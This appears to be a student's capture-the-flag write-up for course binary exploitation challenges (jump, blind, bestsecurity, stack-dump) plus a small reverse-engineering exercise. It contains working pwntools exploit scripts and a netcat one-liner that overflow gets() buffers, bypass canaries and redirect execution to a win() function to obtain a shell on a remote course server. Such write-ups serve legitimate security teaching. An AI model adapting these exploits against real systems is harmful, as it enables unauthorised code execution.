jump
===========================
Flag: FLAG{}
General overview of problems faced
-------------------------------------
I didn't run into any problems for this challenge. It was a very simple buffer overflow exercise which we had done in COMP6841 last term. The fact we were given the `win()` address in the program output made it even easier.

Script/Command used (Writeup)
------------------
Running the program reveals we get prompted for input once. By default after we enter something in, the program flow jumps to an address. We are also given an address to a `win()` function which will come in handy.
To make things more fun, I chose to solve this blindly without looking at the source code, so my writeup will just work with the assembly I attained by running `objdump -d -Mintel jump`. -d flag is for "disassemble" and -Mintel tells objdump to use Intel syntax.
Towards the end of the end of the main function we see that an address in eax is called as a function:
```
 8048610:       8b 45 f8                mov    eax,DWORD PTR [ebp-0x8]
 8048613:       ff d0                   call   eax
```
From this we can deduce that there is a function pointer at ebp-0x8. This is obviously the address we were told we were going to jump to, when we ran the program.
Our means of entering data into the program is the vulnerable `gets()` function which allows the reading of an arbitrary amount of bytes into a buffer. `gets()` has no bounds check on the buffer, so we can overflow the buffer. From the assembly below, we see that the buffer starts at ebp-0x48:
```
 80485e1:       8d 45 b8                lea    eax,[ebp-0x48]
 80485e4:       50                      push   eax
 80485e5:       e8 e6 fd ff ff          call   80483d0 <gets@plt>
```
This means if we just fill the space between ebp-0x48 and ebp-0x8 with dummy data, we can then overwrite the value of the function pointer with the `win()` address. So we need 0x48-0x8 = 0x40 = 64 bytes of dummy padding data before we write the address. If we enter this manually we need to remember to write this in little endian form. the `p32()` function from `pwntools` takes care of this for us, so we can just use that.
The exploit script is as follows:

```
from pwn import *

p = remote('plsdonthaq.me', 2001)
#p = process('./jump')

p.recvuntil('at ')
# extract the win() address from the program's output
win_addr = int(p.recvuntil('\n', drop=True), 16)
p.recvline()

padding = 'A'*64 #0x48 - 0x8
payload = padding + p32(win_addr)

p.sendline(payload)
p.interactive()
```
Alteratively, the following one-liner in a terminal also works:
```
(python -c "print 'A'*64 + '\x36\x85\x04\x08'"; cat) | nc plsdonthaq.me 2001
```
Python prints the payload and pipes it into the netcat connection. `cat` is used to keep stdin open, so I can interact with the remote shell.

blind
===========================
Flag: FLAG{}
General overview of problems faced
-------------------------------------
Didn't have any problems with this one either as it was similar to another challenge from COMP6841. In contrast to trial and erroring my padding size the previous time I solved a challenge like this, I was able systematically work out the required padding size by properly reading the assembly and gaining an understanding of where the return address is kept on the stack.

Script/Command used (Writeup)
------------------
When running the program we get some some text displayed and then we can enter some input. After entering some garbage we find nothing happens and the program exits.
Again I chose to solve this challenge blindly without looking at the source code. Assembly code was attained with `objdump -d -Mintel blind`.
Unlike the previous exercise, there is no function pointer being called so I instead intend to overwrite the return address which will be later loaded into EIP to redirect code execution to the `win()` function.
In this program the `main()` function doesn't do much apart from calling `vuln()`, which is where user input is handled, so we should look there for vulnerabilities. Here's a snippet of code from `vuln()`:
```
 804852f:       8d 45 bc                lea    eax,[ebp-0x44]
 8048532:       50                      push   eax
 8048533:       e8 38 fe ff ff          call   8048370 <gets@plt>
```
As with the previous exercise, the vulnerable `gets()` function is used to read in user input. The buffer starts at ebp-0x44, which we can tell since this is the address loaded into `gets()`. This is a simple diagram of how our stack looks.
```
ebp-0x44 -> +---------------------------+
            |                           |
            |           buffer          |
            |                           |
            |                           |
ebp-0x04 -> +---------------------------+
            | preserved ebx value       |
ebp-0x00 -> +---------------------------+
            | preserved ebp value       |
ebp+0x04 -> +---------------------------+
            | return address (old eip)  |
            +---------------------------+
```
The return address is kept at ebp+0x04 because it the old EIP value gets pushed onto the stack before the old EBP value is pushed on the stack in the `vuln`'s prologue.
From this diagram it seems like we should be able to fill the area of memory with from ebp-0x44 to ebp+0x04 with dummy padding data and then we can write the address of `win()` (0x080484d6) which will overwrite the return address. As if it wasn't obvious by the name `win()`, we know this is the function we need to call since it executes the `system()` function to run `/bin/sh`.
```
080484d6 <win>:
    .
    .
    .
 80484df:       05 21 1b 00 00          add    eax,0x1b21
 80484e4:       8d 90 e0 e5 ff ff       lea    edx,[eax-0x1a20]
 80484ea:       52                      push   edx
 80484eb:       89 c3                   mov    ebx,eax
 80484ed:       e8 9e fe ff ff          call   8048390 <system@plt>
```
So we write 0x04-(-0x44) = 0x48 = 72 bytes of padding data and then the `win()` address and we successfully redirect code execution. The exploit script:
```
from pwn import *

p = remote('plsdonthaq.me', 2002)
#p = process('./blind')
p.recvline()

# 68 is the offset of buffer address from ebp
# 4 is to account for old ebp value that was pushed on the stack
# so we overwrite the return address after padding 72 bytes
# since return address is at ebp+4
padding = 'A'*(68 + 4)
win_addr = p32(0x080484d6)
payload = padding + win_addr

p.sendline(payload)
p.interactive()
```

bestsecurity
===========================
Flag: FLAG{}
General overview of problems faced
-------------------------------------
- Finding the canary value: I instantly knew had to find the "canary" value that was used in the `strncmp` function call, but I just wasn't able to find what the actual value was. From the assembly I knew that 0x804a00c was passed into the function, but I was a bit dumb at the time and forgot that `strncmp` took in pointers to strings, so for a good hour I was trying to use `\x0c\xa0\x04\x08` in my payload which got me nowhere. When I used `ltrace` I saw that the comparison was always being made "1234" so I used that and it worked. Looking back now, I know that what I should have done at the beginning was `x/s 0x804a00c` in gdb to view the string at that address.

Script/Command used (Writeup)
------------------
Running the program reveals we get some text output, then we can enter in some data. Naturally after sending some random data we get a rejection message. So we take a look at the assembly with `objdump -d -Mintel bestsecurity`.
We quickly find that nothing really happens in `main` and all the good stuff is in a function called `check_canary` which is called from `main`. As the name of this function suggests, there will be a "canary" of sorts which we'll need to account for. This is what the canary check looks like:
```
 80491d7:       6a 04                   push   0x4
 80491d9:       68 0c a0 04 08          push   0x804a00c
 80491de:       8d 45 fb                lea    eax,[ebp-0x5]
 80491e1:       50                      push   eax
 80491e2:       e8 a9 fe ff ff          call   8049090 <strncmp@plt>
 80491e7:       83 c4 0c                add    esp,0xc
 80491ea:       85 c0                   test   eax,eax
 80491ec:       75 1c                   jne    804920a <check_canary+0x54>
 80491ee:       68 11 a0 04 08          push   0x804a011
 80491f3:       e8 68 fe ff ff          call   8049060 <puts@plt>
 80491f8:       83 c4 04                add    esp,0x4
 80491fb:       68 2f a0 04 08          push   0x804a02f
 8049200:       e8 6b fe ff ff          call   8049070 <system@plt>
 8049205:       83 c4 04                add    esp,0x4
 8049208:       eb 0d                   jmp    8049217 <check_canary+0x61>
 804920a:       68 37 a0 04 08          push   0x804a037
```
So what happens is `strncmp` is executed to check if some string at 0x804a00c is equal to a string at ebp-0x5. 0x4 (4) bytes are compared. Now if these strings are not equal the `jne` instruction gets triggered, jumping down to another instruction (which happens to push the address of the rejection message on the stack). But if these strings are equal then `puts` will output some string and then `system` is executed to open up a shell. In `gdb` we can execute `x/s 0x804a00c`, revealing that the constant string (serving as a "canary") used in `strncmp` is "1234". Running `ltrace` would also reveal that the `strncmp` function always takes in the constant "1234" as one of its values. Now let's take a look at how input is handled in the program:
```
 80491c8:       8d 85 7b ff ff ff       lea    eax,[ebp-0x85]
 80491ce:       50                      push   eax
 80491cf:       e8 7c fe ff ff          call   8049050 <gets@plt>
```
Yet again the vulnerable `gets` function is used, taking in the address ebp-0x85 so this must be the start of our buffer. This means if we write 128 bytes of data (0x85-0x05 = 0x80 = 128), we'll reach ebp-0x05 and then whatever we write after that will overwrite that data used in the `strncmp`. So obviously we want to write "1234" here. After this the `strncmp` succeeds and we get a shell. The exploit script looks like this:

```
from pwn import *

p = remote('plsdonthaq.me', 2003)
#p = process('./bestsecurity')
p.recvline()

# pad from 0x85 (start of buffer) to 0x5 (location of constant string)
padding = b'A'*128
comparison_string = b'1234'
payload = padding + comparison_string

p.sendline(payload)
p.interactive()
```
It's worth noting that since this is a fake canary, we can actually still overwrite the return address and simply return back into `check_canary` where the success message is pushed onto the stack:
```
 80491ee:       68 11 a0 04 08          push   0x804a011
```
To do this we need to adjust our padding since the return address is at ebp+0x04. ebp+0x04 - ebp-0x85 = 0x89 = 137 bytes of padding. So the following exploit will also work:
```
from pwn import *

p = remote('plsdonthaq.me', 2003)
#p = process('./bestsecurity')
p.recvline()

# pad from ebp-0x85 (start of buffer) to ebp+0x4 (location of return address)
padding = b'A'*0x89
success_addr = p32(0x080491ee)
payload = padding + success_addr

p.sendline(payload)
p.interactive()
```

stack-dump
===========================
Flag: FLAG{}
General overview of problems faced
-------------------------------------
- Getting lost in the assembly: For the most part I was able to solve all the previous challenges using just objdump and a tiny bit of gdb, but I think there was just too much code for me to keep track of in this challenge. As a result I kept getting confused between which addresses related to what and what was actually kept on the stack. Once I opened binary ninja and used the graph view, everything started to make more sense. The main thing I identified from binary ninja was actually the reuse of ebp-0x68 since the variable label var_6c was much more identifiable to me.
- Wrong canary address: Admittedly when I was first attempting this, I was still a bit shaky with reading assembly. So with a larger assembly code base I decided to just trust that the "useful address" we were given was the canary address. Naturally that was a bait and I got some garbage data at that location which would not work. Then after the lecture and learning that canaries end with a null byte it was obvious that what I had was clearly not the canary. Also due to that lecture I was better able to read assembly (and learnt the order in which function parameters were pushed on the stack), so I could identify that the "useful" address was useful because it was offset a particular number of bytes from the actual canary.

Script/Command used (Writeup)
------------------
When we run the program we are first given a "useful stack pointer" which changes each time the program is executed. We are also given 4 options for input:
```
a) input data
b) dump memory
c) print memory map
d) quit
```
An overview of what each option does when we enter:
- a: we get prompted to enter a length. then we can enter a string of that length.
- b: We can view the memory at some weird location, which seems to not contain anything
- c: runs /proc/map
- d: exits the program
Now let's explore the binary.
```
080486c6 <win>:
    .
    .
    .
 80486dd:       e8 6e fe ff ff          call   8048550 <system@plt>
```
Firstly, there is a `win` function which calls `system` to give us our shell. So we're going to have to redirect code execution to this function. Possibly by overwriting the return address? Let's take a look at `main`:
```
 804889a:       b8 00 00 00 00          mov    eax,0x0
 804889f:       8b 4d f8                mov    ecx,DWORD PTR [ebp-0x8]
 80488a2:       65 33 0d 14 00 00 00    xor    ecx,DWORD PTR gs:0x14
 80488a9:       74 29                   je     80488d4 <main+0x1e9>
 80488ab:       eb 22                   jmp    80488cf <main+0x1e4>
 80488ad:       0f b6 45 8f             movzx  eax,BYTE PTR [ebp-0x71]
 80488b1:       0f be c0                movsx  eax,al
 80488b4:       50                      push   eax
 80488b5:       8d 83 5b ea ff ff       lea    eax,[ebx-0x15a5]
 80488bb:       50                      push   eax
 80488bc:       e8 0f fc ff ff          call   80484d0 <printf@plt>
 80488c1:       83 c4 08                add    esp,0x8
 80488c4:       e9 7a fe ff ff          jmp    8048743 <main+0x58>
 80488c9:       90                      nop
 80488ca:       e9 74 fe ff ff          jmp    8048743 <main+0x58>
 80488cf:       e8 7c 00 00 00          call   8048950 <__stack_chk_fail_local>
 80488d4:       8b 5d fc                mov    ebx,DWORD PTR [ebp-0x4]
 80488d7:       c9                      leave  
 80488d8:       c3                      ret
```
So it appears that some data at ebp-0x8 gets XOR'ed with a value in the GS segment register. If the result is zero (the values are the same) then the code jumps near the end of the function and eventually returns. But if the result is not zero then eventually `__stack_chk_fail_local` is run which seems to stop the program without any return, preventing use from returning into the `win` function. At the beginning of main ebp-0x8 is loaded with the data from gs:0x14, so it's obvious that this is a stack canary aiming to mitigate stack smashing:
```
 8048703:       65 a1 14 00 00 00       mov    eax,gs:0x14
 8048709:       89 45 f8                mov    DWORD PTR [ebp-0x8],eax
```
So we have to leak this canary value. But before we can we need to figure out the address of this value. Let's now inspect the address we are given at the start of the program (the "useful pointer"). I traced the `printf` statement that prints out the address, to this set of instructions:
```
 8048730:       8d 45 8f                lea    eax,[ebp-0x71]
 8048733:       50                      push   eax
 8048734:       8d 83 c0 e9 ff ff       lea    eax,[ebx-0x1640]
 804873a:       50                      push   eax
 804873b:       e8 90 fd ff ff          call   80484d0 <printf@plt>
```
So ebx-0x1640 is the location of the string that gets printed out and ebp-0x71 is the "useful stack pointer". This pointer is clearly constantly offset from the canary at ebp-0x8 so we know that the canary is at `useful_pointer + 0x71 - 0x8`.
Now that we have the canary's address we need to leak it. Instinctively this will likely be done with option b) dump memory. First I did a quick test of option a (input data) by specifying length 70 (arbitrary choice) and entered 70 A's. Then when I dumped the memory it tried to dump from 0x41414141 (0x41 is ASCII for 'A'), so I overwrote that address somewhere with my A's.
After using binary ninja to trace the code branches, the reason for this becomes apparent. ebp-0x68 is used to store the input length, then it is used to store the actual data we enter, and on top of that, the value of ebp-0x68 is used as the address to dump memory from.
Now we can craft a payload. First we'll need some padding data to fill in the gap between ebp-0x68 and ebp-0x8 (canary), whcih is 0x60 or 96 bytes. Then we place our canary value which takes up from ebp-0x8 til ebp-0x4. Then we pad another 8 bytes to fill from ebp-0x4 to ebp+0x4, where we can then overwrite the return address with the address of the win function. The final exploit looks like this:

```
from pwn import *

p = remote('plsdonthaq.me', 2004)
#p = process('./stack-dump')

p.recvuntil('pointer ')
#useful pointer is at ebp-0x71 and stack canary is at ebp-0x8
canary_addr = p32(int(p.recvline().rstrip(), 16) + 0x71 - 0x8)
p.recvlines(4)
p.sendline('a')
p.recvuntil('len: ')
p.sendline('4')
p.sendline(canary_addr)
p.recvlines(10)
p.sendline('b')
p.recvuntil(': ')
canary_val = p.recvline().rstrip()[:4]
# pad from ebp-0x60 (input buffer) to ebp-0x8 (canary location)
padding = b'A'*0x60
# pad from ebp-0x4 (after canary) to ebp+0x4 (location of return address)
padding2 = b'A'*0x8
win_addr = p32(0x080486c6)
payload = padding + canary_val + padding2 + win_addr
p.recvlines(4)
p.sendline('a')
p.recvuntil('len: ')
p.sendline(str(len(payload)))
p.sendline(payload)
p.recvlines(10)
p.sendline('d')
p.interactive()

```

chall1 (reverse engineering challenge)
===========================
Attempt at replicating gcc arguments: `gcc -m32 -fno-pie -no-pie -O -o chall1 chall1.c`
General overview of problems faced
-------------------------------------
Writing the C code from the given assembly was relatively straightforward and I didn't have any issues. However when trying to compile my C code and comparing the `objdump` output with the given image I saw a lot of differences. Most of these ended up being resolved by using different `gcc` arguments when compiling:
 - Weird addresses like `0000000000401132 <main>` - Eventually I realised this was due to 64-bit compilation so I used the `gcc` argument `-m32` and started getting the address like `08049172 <main>` which I am more familiar with.
 - Calls to `__x86.get_pc_thunk.bx` - I found online that calls to this function are made in position independent code on x86. The solution to this was to add the `-fno-pie -no-pie` arguments when using `gcc` to compile.
A couple things are still different between my binary's `objdump` output and the given image. For example in the image the `if` branch is accounted for with a `jne` instruction whereas my assembly uses `je`, but I was unable to find a way for `gcc` to force something like that. Nonetheless I think my code will have very similar behaviour to the original.

Reversed C Code
------------------

```
#include <stdio.h>

int main() {
    int input;
    scanf("%d", &input);
    if (input == 1337) {
        printf("Your so leet!");
    } else {
        printf("Bye");
    }
    return 1;
}
```